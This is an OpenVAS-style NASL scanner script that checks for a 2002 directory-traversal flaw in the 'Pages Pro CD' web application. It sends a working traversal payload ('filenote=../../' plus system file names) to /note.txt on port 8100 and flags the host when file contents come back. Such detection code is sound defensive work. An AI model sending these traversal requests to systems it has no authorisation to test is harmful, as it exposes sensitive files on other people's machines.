if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.11221" );
	script_version( "2021-04-16T06:57:08+0000" );
	script_tag( name: "last_modification", value: "2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)" );
	script_tag( name: "creation_date", value: "2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)" );
	script_tag( name: "cvss_base", value: "6.8" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:M/Au:N/C:P/I:P/A:P" );
	script_name( "Pages Pro CD directory traversal" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2002 Michel Arboi" );
	script_family( "Web application abuses" );
	script_dependencies( "find_service.sc", "httpver.sc", "os_detection.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 8100 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_xref( name: "URL", value: "http://www.cert.ssi.gouv.fr/site/CERTA-2002-ALE-007/" );
	script_tag( name: "solution", value: "Upgrade it (version 2003) or uninstall this product" );
	script_tag( name: "summary", value: "A security vulnerability in the 'Pages Pro' allows anybody
  to read or modify files that would otherwise be inaccessible using a
  directory traversal attack." );
	script_tag( name: "impact", value: "A cracker may use this to read or write sensitive files or even
  make a phone call." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "qod_type", value: "remote_vul" );
	exit( 0 );
}
require("host_details.inc.sc");
require("os_func.inc.sc");
require("misc_func.inc.sc");
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
port = http_get_port( default: 8100 );
files = traversal_files();
for file in keys( files ) {
	url = "/note.txt?F_notini=&T_note=&nomentreprise=blah&filenote=../../" + files[file];
	if(http_vuln_check( port: port, url: url, pattern: file )){
		report = http_report_vuln_url( port: port, url: url );
		security_message( port: port, data: report );
		exit( 0 );
	}
}
exit( 99 );

